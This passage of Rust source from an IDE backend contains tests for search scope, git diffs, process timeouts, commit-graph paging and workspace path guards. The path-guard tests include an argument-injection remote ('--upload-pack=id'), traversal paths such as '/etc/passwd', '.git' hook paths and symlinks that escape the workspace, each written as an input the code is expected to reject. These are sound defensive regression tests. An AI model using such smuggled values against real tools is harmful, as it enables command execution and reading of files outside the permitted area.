    // 先剔除已关闭窗口的残留条目：注册表只在 set_window_title 时写入，
    // 窗口关闭后没人清理，「打开的项目」会一直列出打不开的幽灵窗口。
    // （lib.rs 的 on_window_event 已在关闭时删除，这里是兜底。）
    // 清理与读取必须合并在**同一次锁作用域**内：原先两次独立加锁，
    // 窗口恰在两次加锁之间关闭时，读到的是未清理/半清理的状态。
    let live: std::collections::HashSet<String> =
        window.webview_windows().keys().cloned().collect();
    registry
        .0
        .lock()
        .map(|mut guard| {
            guard.retain(|label, _| live.contains(label));
            guard
                .iter()
                .filter(|(label, _)| label.as_str() != own)
                .map(|(label, (title, path))| WindowInfoDto {
                    label: label.clone(),
                    title: title.clone(),
                    path: path.clone(),
                })
                .collect()
        })
        .unwrap_or_default()
}

/// 把指定窗口带到前台（多项目多窗口时的切换入口）
#[tauri::command]
pub fn focus_window(app: tauri::AppHandle, label: String) -> Result<(), String> {
    let win = tauri::Manager::get_webview_window(&app, &label)
        .ok_or_else(|| format!("窗口不存在: {label}"))?;
    // 显隐/聚焦是 best-effort：句柄在手（上面已查到），失败只可能是竞态销毁；
    // 不向上传（命令 Ok 不代表"已在前台"），但必须记日志（R4）。
    if let Err(e) = win.show() {
        log::warn!("窗口 {label} show 失败: {e}");
    }
    if let Err(e) = win.unminimize() {
        log::warn!("窗口 {label} unminimize 失败: {e}");
    }
    if let Err(e) = win.set_focus() {
        log::warn!("窗口 {label} set_focus 失败: {e}");
    }
    Ok(())
}

#[cfg(test)]
mod search_scope_tests {
    use super::*;

    /// 构造一棵含「构建产物 / 二进制 / 超大文本 / 普通源文件」的目录树，
    /// 跑真实的 search_dir_internal，断言读入范围被正确收紧。
    ///
    /// 回归的是审计发现的 P1：跳过名单与 read_directory 的 is_ignored_entry
    /// 不一致（漏 dist/build/vendor），且无大小上限与二进制检测，
    /// dist/assets 下的 ts.worker(8MB)/monaco(4MB) 会被整体 read_to_string。
    fn build_tree(root: &Path) {
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::create_dir_all(root.join("dist/assets")).unwrap();
        std::fs::create_dir_all(root.join("screenshots")).unwrap();
        std::fs::create_dir_all(root.join("node_modules/pkg")).unwrap();

        std::fs::write(root.join("src/needle.rs"), "let needle = 1;").unwrap();
        // node_modules 是硬忽略目录：其内容不应被搜索
        std::fs::write(
            root.join("node_modules/pkg/needle-bundle.js"),
            "var needle = 1;",
        )
        .unwrap();
        // 二进制：NUL 出现在前 512 字节，必须跳过
        std::fs::write(
            root.join("screenshots/needle.png"),
            b"\x89PNG\r\n\x1a\n\x00\x00needle",
        )
        .unwrap();
        // 超大文本：内容含 needle 但超过 4 MiB 上限
        let mut big = String::new();
        big.push_str("needle ");
        big.push_str(&"x".repeat(MAX_SEARCH_FILE_BYTES as usize));
        std::fs::write(root.join("dist/needle-big.js"), big).unwrap();
    }

    #[test]
    fn search_dir_internal_skips_ignored_dirs_and_binaries() {
        let root = std::env::temp_dir().join(format!(
            "ide_audit_search_{}_{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&root);
        build_tree(&root);

        let mut results: Vec<SearchResultDto> = Vec::new();
        search_dir_internal(&root, "needle", false, &mut results, 100);
        let names: Vec<String> = results
            .iter()
            .map(|r| {
                PathBuf::from(&r.file_path)
                    .file_name()
                    .unwrap()
                    .to_string_lossy()
                    .into_owned()
            })
            .collect();

        assert_eq!(
            names,
            vec!["needle.rs".to_string()],
            "实际命中: {:?}",
            names
        );
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 审计 5.1 回归：遍历不跟随软链 —— 一个 `latest -> <工作区外目录>` 就能
    /// 让「展开全部」/内容搜索走出工作区；成环还会把递归推深。
    #[cfg(unix)]
    #[test]
    fn traversal_does_not_follow_symlinked_directories() {
        let stamp = format!("{}_{}", std::process::id(), line!());
        let base = std::env::temp_dir().join(format!("ide_audit_symlink_{}", stamp));
        let outside = std::env::temp_dir().join(format!("ide_audit_outside_{}", stamp));
        let _ = std::fs::remove_dir_all(&base);
        let _ = std::fs::remove_dir_all(&outside);
        std::fs::create_dir_all(base.join("project")).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(base.join("project/a.txt"), "needle here").unwrap();
        std::fs::write(outside.join("secret.txt"), "needle secret").unwrap();
        // 指向工作区外的目录 + 自指环
        std::os::unix::fs::symlink(&outside, base.join("project/latest")).unwrap();
        std::os::unix::fs::symlink(".", base.join("project/loop")).unwrap();

        // 目录树：软链只作叶子出现，不再下探（环也不会被展开）
        let mut budget = 0usize;
        let node = scan_node(&base.join("project"), MAX_SCAN_DEPTH, None, &mut budget).unwrap();
        let children = node.children.expect("应返回子节点");
        let names: Vec<&str> = children.iter().map(|c| c.name.as_str()).collect();
        assert!(names.contains(&"a.txt"), "实际: {:?}", names);
        assert!(
            children.iter().all(|c| c.name != "secret.txt"),
            "不得跟着软链走出工作区: {:?}",
            names
        );
        for name in ["latest", "loop"] {
            let child = children.iter().find(|c| c.name == name).expect(name);
            assert!(!child.is_directory, "{} 应作为叶子节点", name);
            assert!(child.children.is_none(), "{} 不得被展开", name);
        }

        // 内容搜索同样不下探软链
        let mut results: Vec<SearchResultDto> = Vec::new();
        search_dir_internal(&base.join("project"), "needle", false, &mut results, 100);
        assert_eq!(
            results.len(),
            1,
            "只应命中 project/a.txt: {:?}",
            results.len()
        );
        assert!(results[0].file_path.ends_with("a.txt"));

        let _ = std::fs::remove_dir_all(&base);
        let _ = std::fs::remove_dir_all(&outside);
    }

    #[test]
    fn is_binary_file_detects_nul_prefix() {
        let dir = std::env::temp_dir().join(format!("ide_audit_bin_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let bin = dir.join("a.bin");
        std::fs::write(&bin, b"\x00\x01needle").unwrap();
        let txt = dir.join("a.txt");
        std::fs::write(&txt, b"needle").unwrap();
        assert!(is_binary_file(&bin));
        assert!(!is_binary_file(&txt));
        // 不可读/不存在：保守跳过（等价旧实现 read_to_string 失败即跳过）
        assert!(is_binary_file(&dir.join("missing")));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 审计 5.2 回归：`find_ci` 走预编译 needle 后语义不变 —— ASCII needle
    /// 的字节快路径看不到「非 ASCII 字符折叠成 ASCII」的匹配（İ → i̇），
    /// 必须回退到 Unicode 路径。
    #[test]
    fn find_ci_prepared_keeps_unicode_folding_semantics() {
        // İ 小写化展开成 "i" + U+0307，字节级扫描看不到这个匹配
        assert_eq!(find_ci("İstanbul", "i"), Some(0));
        assert_eq!(find_ci("İstanbul", "stan"), Some(2));
        assert_eq!(find_ci("你好世界", "世界"), Some(6));
        assert_eq!(find_ci("HELLO world", "world"), Some(6));
        assert_eq!(find_ci("HELLO", "xyz"), None);
        // 预编译路径与一次性路径结果一致
        let needle = prepare_ci_needle("WoRlD");
        assert_eq!(find_ci_prepared("hello world", &needle), Some(6));
    }
}

#[cfg(test)]
mod new_file_diff_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn scratch(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("ide_newfile_{}_{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        git(&dir, &["init", "-q", "-b", "main"]);
        fs::write(dir.join("base.txt"), "base\n").unwrap();
        git(&dir, &["add", "."]);
        git(
            &dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "base",
            ],
        );
        dir
    }

    /// 用户报告场景：新文件已 `git add`（暂存为 A），在变更列表里点开时
    /// 走的是「工作区 vs 索引」比较 —— 该比较为空，但文件对 HEAD 而言是全新的，
    /// 必须显示为全新增，而不是「该文件没有未提交的改动」。
    #[test]
    fn staged_new_file_viewed_as_worktree_diff_shows_all_added() {
        let dir = scratch("staged_as_worktree");
        fs::write(dir.join("brand.txt"), "n1\nn2\n").unwrap();
        git(&dir, &["add", "brand.txt"]);
        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_diff_impl(repo, "brand.txt".to_string(), None).unwrap();
        assert!(
            !d.lines.is_empty(),
            "已暂存的新文件在「工作区 diff」里必须显示全新增内容，实际 lines={:?}",
            d.lines
        );
        assert_eq!(d.additions, 2);
        assert!(d.is_new, "对 HEAD 而言是新文件，应标记 is_new");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 未跟踪文件：git diff 本身无输出，必须回退成「与空文件对比」的全新增差异
    #[test]
    fn untracked_file_yields_all_added_diff() {
        let dir = scratch("untracked");
        fs::write(dir.join("new.txt"), "l1\nl2\nl3\n").unwrap();
        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_diff_impl(repo, "new.txt".to_string(), None).unwrap();
        assert!(
            !d.lines.is_empty(),
            "未跟踪文件必须产出差异行，实际 lines={:?} additions={} is_new={}",
            d.lines,
            d.additions,
            d.is_new
        );
        assert_eq!(d.additions, 3, "三行新内容应全部计为新增");
        assert!(d.is_new, "未跟踪文件应标记为新增");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 已暂存的新文件：git diff --cached 本身就能给出全新增差异
    #[test]
    fn staged_new_file_yields_all_added_diff() {
        let dir = scratch("staged");
        fs::write(dir.join("new.txt"), "a\nb\n").unwrap();
        git(&dir, &["add", "new.txt"]);
        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_diff_impl(repo, "new.txt".to_string(), Some(true)).unwrap();
        assert!(
            !d.lines.is_empty(),
            "已暂存新文件必须有差异行: {:?}",
            d.lines
        );
        assert_eq!(d.additions, 2);
        let _ = fs::remove_dir_all(&dir);
    }

    /// 提交内的新文件：git show 应给出全新增差异
    #[test]
    fn committed_new_file_yields_all_added_diff() {
        let dir = scratch("committed");
        fs::write(dir.join("added.txt"), "x\ny\n").unwrap();
        git(&dir, &["add", "added.txt"]);
        git(
            &dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "add file",
            ],
        );
        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_show_impl(
            repo.clone(),
            "HEAD".to_string(),
            Some("added.txt".to_string()),
        )
        .unwrap();
        assert!(
            !d.lines.is_empty(),
            "提交内新文件必须有差异行: {:?}",
            d.lines
        );
        assert_eq!(d.additions, 2);
        assert!(d.is_new, "提交内新文件应标记 is_new");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 未跟踪文件 ×「与某版本比较」：同样不能显示为空
    #[test]
    fn untracked_file_vs_ref_yields_all_added_diff() {
        let dir = scratch("vsref");
        fs::write(dir.join("fresh.txt"), "one\n").unwrap();
        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_diff_ref_worktree(repo, "HEAD".to_string(), "fresh.txt".to_string()).unwrap();
        assert!(
            !d.lines.is_empty(),
            "未跟踪文件与版本比较必须产出差异: {:?}",
            d.lines
        );
        let _ = fs::remove_dir_all(&dir);
    }

    /// 用户报告场景端到端：文件本体含 `Binary files` / `new file mode` /
    /// `deleted file mode` 字面量时，补丁正文会带上这些行 —— 三条 diff 入口
    /// （工作区 / 暂存 / 提交）都不得据此把纯文本 diff 标成二进制或新增：
    /// 标成二进制后前端 diff 页整块空白（既不挂 DiffEditor，也不渲染行）。
    #[test]
    fn text_file_naming_file_header_markers_diffs_as_text() {
        let dir = scratch("marker_literals");
        let base = "fn probe() {\n    \
    let is_binary = text.contains(\"Binary files\");\n    \
    let is_new = text.contains(\"new file mode\");\n    \
    let is_deleted = text.contains(\"deleted file mode\");\n    \
    let x = 1;\n}\n";
        fs::write(dir.join("probe.rs"), base).unwrap();
        git(&dir, &["add", "probe.rs"]);
        git(
            &dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "probe",
            ],
        );

        // 只改最后一行：三条字面量行都落进 hunk 的上下文窗口（与 commands.rs 实况一致）
        fs::write(
            dir.join("probe.rs"),
            base.replace("let x = 1;", "let x = 2;"),
        )
        .unwrap();
        let repo = Some(dir.to_string_lossy().to_string());

        let check = |d: &FileDiffDto, tag: &str| {
            assert!(!d.is_binary, "{tag}: 纯文本补丁不得标成二进制");
            assert!(!d.is_new, "{tag}: 普通修改不得标成新增");
            assert!(!d.is_deleted, "{tag}: 普通修改不得标成删除");
            assert!(
                d.lines.iter().any(|l| l.kind == "add"),
                "{tag}: 必须产出可渲染的差异行，实际 {:?}",
                d.lines
            );
        };

        // 工作区 vs 索引
        check(
            &git_diff_impl(repo.clone(), "probe.rs".to_string(), None).unwrap(),
            "工作区",
        );

        // 索引 vs HEAD（暂存后）
        git(&dir, &["add", "probe.rs"]);
        check(
            &git_diff_impl(repo.clone(), "probe.rs".to_string(), Some(true)).unwrap(),
            "暂存区",
        );

        // 某提交相对其父提交
        git(
            &dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "touch",
            ],
        );
        check(
            &git_show_impl(
                repo.clone(),
                "HEAD".to_string(),
                Some("probe.rs".to_string()),
            )
            .unwrap(),
            "提交内",
        );

        // 「与某版本比较」
        check(
            &git_diff_ref_worktree(repo, "HEAD^".to_string(), "probe.rs".to_string()).unwrap(),
            "与版本比较",
        );

        let _ = fs::remove_dir_all(&dir);
    }

    /// 真二进制文件仍须被标出（不能为了修字面量误判而把二进制检测也一起削掉）
    #[test]
    fn genuine_binary_file_is_still_flagged() {
        let dir = scratch("binary_still");
        fs::write(dir.join("blob.bin"), [0u8, 1, 2, 3, b'x', 0, 7]).unwrap();
        git(&dir, &["add", "blob.bin"]);
        git(
            &dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "bin",
            ],
        );
        fs::write(dir.join("blob.bin"), [0u8, 1, 2, 9, b'y', 0, 8]).unwrap();

        let repo = Some(dir.to_string_lossy().to_string());
        let d = git_diff_impl(repo, "blob.bin".to_string(), None).unwrap();
        assert!(d.is_binary, "二进制文件必须标成 is_binary");
        assert!(
            !d.lines
                .iter()
                .any(|l| matches!(l.kind.as_str(), "add" | "del" | "context")),
            "二进制补丁不该产出正文行: {:?}",
            d.lines
        );
        let _ = fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod timeout_tests {
    use super::*;
    use std::time::{Duration, Instant};

    /// 审计 2.1 回归（P0）：孙进程持有 stdout 管道时，超时必须在
    /// timeout + 宽限期内返回。
    ///
    /// 旧实现只 `kill()` 直接子进程，`sh -c 'sleep 40 & wait'` 里那个 sleep
    /// 仍持有管道写端，调用线程卡在 `read_to_end` 上 —— 实测「15 秒超时」的
    /// git commit 在 pre-commit 钩子跑 `sleep 40` 时实际阻塞 40.5 秒，返回的
    /// 却是「已终止」。
    #[cfg(unix)]
    #[test]
    fn timeout_returns_promptly_when_grandchild_holds_pipe() {
        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg("sleep 40 & wait");
        let started = Instant::now();
        let err = run_with_timeout_spawn(&mut cmd, Duration::from_millis(300)).unwrap_err();
        let elapsed = started.elapsed();
        assert!(
            elapsed < Duration::from_millis(1800),
            "带孙进程的超时必须及时返回，实际耗时 {:?}（错误: {}）",
            elapsed,
            err
        );
        assert!(err.contains("命令超过"), "应报超时错误，实际: {err}");
    }

    /// 超时后子进程（及其孙进程）必须真的退出，不能只是「不再等它」。
    #[cfg(unix)]
    #[test]
    fn timeout_kills_whole_process_group() {
        let marker = std::env::temp_dir().join(format!(
            "ide_timeout_pgid_{}_{}",
            std::process::id(),
            line!()
        ));
        let _ = fs::remove_file(&marker);
        let mut cmd = Command::new("sh");
        // sleep 完再写标记文件：进程组被杀时标记文件不应出现
        cmd.arg("-c").arg(format!(
            "sleep 1 && : > '{}'",
            marker.to_string_lossy().replace('\'', "'\\''")
        ));
        let err = run_with_timeout_spawn(&mut cmd, Duration::from_millis(200)).unwrap_err();
        assert!(err.contains("命令超过"), "应报超时错误，实际: {err}");
        std::thread::sleep(Duration::from_millis(1200));
        assert!(
            !marker.exists(),
            "孙进程应在进程组被 SIGKILL 时一并终止（标记文件 {} 不该出现）",
            marker.display()
        );
    }

    /// 正常路径不受影响：拿到真实 stdout/stderr 与退出码，也不该被当成超时。
    #[cfg(unix)]
    #[test]
    fn normal_run_reports_output_and_exit_code() {
        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg("echo out; echo err >&2; exit 3");
        let out = run_with_timeout_spawn(&mut cmd, Duration::from_secs(10)).unwrap();
        assert_eq!(out.status.code(), Some(3));
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "out");
        assert_eq!(String::from_utf8_lossy(&out.stderr).trim(), "err");
    }
}

#[cfg(test)]
mod graph_page_continuity_tests {
    use super::*;

    fn go(dir: &Path, max: Option<u32>, skip: Option<u32>) -> Vec<GitCommitDto> {
        git_log_impl(
            Some(dir.to_string_lossy().to_string()),
            max,
            skip,
            None,
            None,
            None,
        )
        .unwrap()
    }

    /// 每次提交递增一秒。
    ///
    /// 必须显式推进时间：同刻（哪怕同一秒）的一批提交，git log 的拓扑序在同刻
    /// 之间不保证稳定，build() 的 9 条提交会得到不同的行序，测试随机失败。
    /// 递增时间戳让顺序完全由数据决定。
    fn run_git(dir: &Path, args: &[&str], tick: usize) {
        let date = format!("2024-01-01T00:{:02}:{:02} +0000", tick / 60, tick % 60);
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@t.com")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@t.com")
            .env("GIT_AUTHOR_DATE", &date)
            .env("GIT_COMMITTER_DATE", &date)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// 造一段「一条分支跨过十几行才再落地」的历史。
    ///
    /// 目标形态：HEAD 侧一条线连着走十几行，旁支只有一两个提交挂在很远的
    /// 下方 —— 正是用户截图里「图从中间断开」的场景。为了让轨迹足够长，
    /// 主分支造 12 条、旁支造 2 条，最后合并把两股收拢。
    fn build(dir: &Path) {
        let mut tick = 0usize;
        let mut step = |dir: &Path, args: &[&str]| {
            run_git(dir, args, tick);
            tick += 1;
        };
        step(dir, &["init", "-q", "-b", "main"]);
        for i in 1..=12 {
            std::fs::write(dir.join(format!("c{i}")), format!("c{i}")).unwrap();
            step(dir, &["add", "."]);
            step(dir, &["commit", "-qm", &format!("s{i}")]);
        }
        // 旁支从 11 条之前分出，只带两个提交，之后主分支还走十几行 —— 长跨度
        step(dir, &["checkout", "-qb", "topic", "HEAD~10"]);
        std::fs::write(dir.join("t1"), "t1").unwrap();
        step(dir, &["add", "."]);
        step(dir, &["commit", "-qm", "topic1"]);
        std::fs::write(dir.join("t2"), "t2").unwrap();
        step(dir, &["add", "."]);
        step(dir, &["commit", "-qm", "topic2"]);
        // 回到主分支再走几条，然后合并
        step(dir, &["checkout", "-q", "main"]);
        for i in 13..=15 {
            std::fs::write(dir.join(format!("c{i}")), format!("c{i}")).unwrap();
            step(dir, &["add", "."]);
            step(dir, &["commit", "-qm", &format!("s{i}")]);
        }
        step(dir, &["merge", "--no-ff", "topic", "-m", "merge topic"]);
    }

    /// 续页不能把上一页穿过页边界的直通线弄断。
    ///
    /// `git log --skip N` 只有本页的一段历史，布局算法从空轨道开始时，上一页
    /// 里活跃的轨道会在新页第一行整体消失 —— 用户看到主干图从中间断开。
    /// 真值 = 一次取全量的对应行；分页结果必须逐行一致。
    #[test]
    fn paged_log_keeps_lanes_continuous_across_page_boundary() {
        let dir = std::env::temp_dir().join(format!("ide_pagecont_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        build(&dir);

        let all = go(&dir, Some(50), None);
        assert!(
            all.len() >= 15,
            "build() 造的历史至少 15 条提交，实际 {}",
            all.len()
        );

        let p1 = go(&dir, Some(4), None);
        let p2 = go(&dir, Some(4), Some(4));
        assert_eq!(p1.len(), 4, "第一页条数");
        assert_eq!(p2.len(), 4, "第二页条数");
        assert_eq!(
            all[4].message, p2[0].message,
            "p2 首条应等于全量第 5 行，衔接错位说明 skip 偏移算错"
        );

        for (i, (truth, got)) in all.iter().skip(4).zip(p2.iter()).enumerate() {
            assert_eq!(truth.message, got.message, "第 {} 行消息不一致", i);
            assert_eq!(
                truth.graph_track, got.graph_track,
                "p2[{}] ({}) 轨道编号与全量不一致",
                i, got.message
            );
            assert_eq!(
                truth.graph_straight, got.graph_straight,
                "p2[{}] ({}) 直通轨道与全量不一致 —— 跨页连线断了",
                i, got.message
            );
            assert_eq!(
                truth.graph_outs, got.graph_outs,
                "p2[{}] ({}) 出发边与全量不一致",
                i, got.message
            );
        }

        // 全量第 5..8 行里至少有一条是「带直通线」的行，否则上面几条等于没测
        let has_straight = all
            .iter()
            .skip(4)
            .take(4)
            .any(|c| !c.graph_straight.is_empty());
        assert!(
            has_straight,
            "第二页范围内应有带直通轨道的行，否则本测试为空转"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// skip 落在末条附近：多取的承接行不存在，不能 panic 也不能吞提交。
    #[test]
    fn paged_log_survives_skip_past_tail() {
        let dir = std::env::temp_dir().join(format!("ide_pagetail_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        build(&dir);

        let all = go(&dir, Some(50), None);
        let tail = go(&dir, Some(5), Some((all.len() - 1) as u32));
        assert_eq!(
            tail.len(),
            1,
            "skip={} 应只剩 1 条，实际 {}",
            all.len() - 1,
            tail.len()
        );
        assert_eq!(tail[0].hash, all.last().unwrap().hash);

        let empty = go(&dir, Some(5), Some((all.len() + 5) as u32));
        assert!(empty.is_empty(), "超范围 skip 应为空，实际 {}", empty.len());

        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod path_guard_tests {
    use std::fs;

    fn temp_dir(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "ide_guard_{tag}_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    use super::{
        base64_encode, ensure_safe_git_path, format_bytes, fs_create_file_impl, git_fetch,
        image_mime_for, is_ignored_entry, read_file_content_impl, read_repo_worktree_text,
        register_workspace_dir, WorkspaceRegistry, MAX_READ_FILE_BYTES, MAX_READ_FILE_BYTES_FORCE,
    };

    #[test]
    fn safe_git_path_blocks_dotgit_segments() {
        // 正常路径放行
        for p in [
            "a/b.txt",
            "src/main.rs",
            ".",
            "repo.git/a.txt",
            "a.gitignore",
        ] {
            assert!(ensure_safe_git_path(p).is_ok(), "{p} 应放行");
        }
        // 已有行为回归：绝对路径与 .. 段
        assert!(ensure_safe_git_path("/etc/passwd").is_err());
        assert!(ensure_safe_git_path("../x").is_err());
        assert!(ensure_safe_git_path("a/../../x").is_err());
        // 新增：.git 段（大小写不敏感），首段/中间段都要拦
        for p in [".git/config", "a/.git/hooks/x", ".GIT/config", "a/.Git/x"] {
            let err = ensure_safe_git_path(p).unwrap_err();
            assert!(
                err.starts_with("ERR:dotgit_path_rejected|"),
                "{p} 应走 dotgit 码，实际 {err}"
            );
        }
        // -- 之后的 pathspec magic 仍会展开到整棵树，破坏性入口必须拒绝
        for p in [
            ":!important",
            ":(glob)*",
            "src/*.rs",
            "what?.txt",
            "a[bc].txt",
        ] {
            let err = ensure_safe_git_path(p).unwrap_err();
            assert!(
                err.starts_with("ERR:pathspec_magic_rejected|"),
                "{p} 应走 pathspec 码，实际 {err}"
            );
        }
    }

    /// 新建文件不能顺着仓库里的悬空软链在区外落盘。
    #[cfg(unix)]
    #[test]
    fn create_file_rejects_dangling_symlink_target() {
        let dir = temp_dir("create_link_root");
        let outside = temp_dir("create_link_outside");
        let reg = WorkspaceRegistry::default();
        register_workspace_dir(&reg, &dir.to_string_lossy(), false).unwrap();
        let target = outside.join("created.txt");
        std::os::unix::fs::symlink(&target, dir.join("pwn.txt")).unwrap();

        let err = tauri::async_runtime::block_on(fs_create_file_impl(
            &dir.to_string_lossy(),
            "pwn.txt",
            &reg,
        ))
        .expect_err("悬空软链不能被当作新文件");
        assert_eq!(
            crate::error_proto::parse_error(&err).code(),
            Some("path_outside_workspace"),
            "应拒绝软链，实际: {err}"
        );
        assert!(!target.exists(), "不能在区外创建文件");

        // 中间目录是软链时同样拒绝
        let outside_dir = outside.join("outside_dir");
        fs::create_dir_all(&outside_dir).unwrap();
        std::os::unix::fs::symlink(&outside_dir, dir.join("linkdir")).unwrap();
        assert!(tauri::async_runtime::block_on(fs_create_file_impl(
            &dir.to_string_lossy(),
            "linkdir/new.txt",
            &reg,
        ))
        .is_err());
        assert!(!outside_dir.join("new.txt").exists());

        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&outside);
    }

    /// 冲突文件读取不能顺着仓库软链泄露仓库外内容。
    #[cfg(unix)]
    #[test]
    fn merge_worktree_read_does_not_follow_symlinks_outside_repo() {
        let dir = temp_dir("merge_read_link");
        let outside = temp_dir("merge_read_outside");
        fs::write(dir.join("inside.txt"), "inside").unwrap();
        fs::write(outside.join("secret.txt"), "secret").unwrap();
        std::os::unix::fs::symlink(outside.join("secret.txt"), dir.join("link.txt")).unwrap();
        assert_eq!(
            read_repo_worktree_text(&dir.to_string_lossy(), "inside.txt"),
            "inside"
        );
        assert_eq!(
            read_repo_worktree_text(&dir.to_string_lossy(), "link.txt"),
            "",
            "软链指向仓库外时必须返回空，而不是目标内容"
        );
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn fetch_rejects_option_like_remote_without_network() {
        // 校验在 spawn 之前：传恶意 remote 必须直接 Err，且不能发起任何网络。
        // 用不存在的目录当仓库 —— 若校验漏了，错误会是 git 执行失败而非校验码。
        let err = tauri::async_runtime::block_on(git_fetch(
            Some("/nonexistent-dir-xyz".to_string()),
            Some("--upload-pack=id".to_string()),
        ))
        .unwrap_err();
        assert!(
            err.starts_with("ERR:ref_invalid_leading_dash|"),
            "恶意 remote 应被入口校验拦下，实际 {err}"
        );
        // 正常 remote 名放行到执行层（目录不存在 → git 执行失败，而非校验失败）
        let err2 = tauri::async_runtime::block_on(git_fetch(
            Some("/nonexistent-dir-xyz".to_string()),
            Some("origin".to_string()),
        ))
        .unwrap_err();
        assert!(
            !err2.starts_with("ERR:ref_invalid_leading_dash|"),
            "正常 remote 不应被校验拦下，实际 {err2}"
        );
    }

    #[test]
    fn read_rejects_oversize_files_before_loading() {
        use super::{register_workspace_dir, WorkspaceRegistry};
        let dir = std::env::temp_dir().join(format!("ide_readcap_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let registry = WorkspaceRegistry::default();
        register_workspace_dir(&registry, dir.to_str().unwrap(), false).unwrap();

        // 小文件正常读
        let small = dir.join("small.txt");
        std::fs::write(&small, "hello").unwrap();
        let text = tauri::async_runtime::block_on(read_file_content_impl(
            small.to_str().unwrap(),
            false,
            &registry,
            None,
        ))
        .unwrap();
        assert_eq!(text, "hello");

        // 超软上限：不加 force 拒绝，加 force 放行（用稀疏方式造大文件，
        // 避免测试本身写 8MB+ 磁盘：set_len 只改元数据）。
        let big = dir.join("big.bin");
        let f = std::fs::File::create(&big).unwrap();
        f.set_len(MAX_READ_FILE_BYTES + 1).unwrap();
        drop(f);
        let err = tauri::async_runtime::block_on(read_file_content_impl(
            big.to_str().unwrap(),
            false,
            &registry,
            None,
        ))
        .unwrap_err();
        assert!(
            err.starts_with("ERR:file_too_large|"),
            "超限文件应走 file_too_large 码，实际 {err}"
        );
        // force=true 绕过软上限（文件是空洞，内容全零但可读）
        let forced = tauri::async_runtime::block_on(read_file_content_impl(
            big.to_str().unwrap(),
            true,
            &registry,
            None,
        ));
        assert!(forced.is_ok(), "force 应绕过软上限，实际 {forced:?}");

        // 超硬上限：force 也拒绝
        let huge = dir.join("huge.bin");
        let f2 = std::fs::File::create(&huge).unwrap();
        f2.set_len(MAX_READ_FILE_BYTES_FORCE + 1).unwrap();
        drop(f2);
        let err2 = tauri::async_runtime::block_on(read_file_content_impl(
            huge.to_str().unwrap(),
            true,
            &registry,
            None,
        ))
        .unwrap_err();
        assert!(
            err2.starts_with("ERR:file_too_large|"),
            "超硬上限 force 也应拒绝，实际 {err2}"
        );

        assert_eq!(format_bytes(500), "500 B");
        assert_eq!(format_bytes(2048), "2.0 KB");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn file_probe_reports_stat_and_cache_serves_hits() {
        use super::{file_probe_impl, register_workspace_dir, WorkspaceRegistry};
        use crate::file_cache::FileCache;
        let dir = std::env::temp_dir().join(format!("ide_probe_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let registry = WorkspaceRegistry::default();
        register_workspace_dir(&registry, dir.to_str().unwrap(), false).unwrap();
        let cache = FileCache::default();

        let f = dir.join("probe.txt");
        std::fs::write(&f, "hello probe").unwrap();
        let p = f.to_str().unwrap();

        // 探针：存在 + 长度 + mtime，三次调用稳定（快路径的基线）
        let a = tauri::async_runtime::block_on(file_probe_impl(p, &registry)).unwrap();
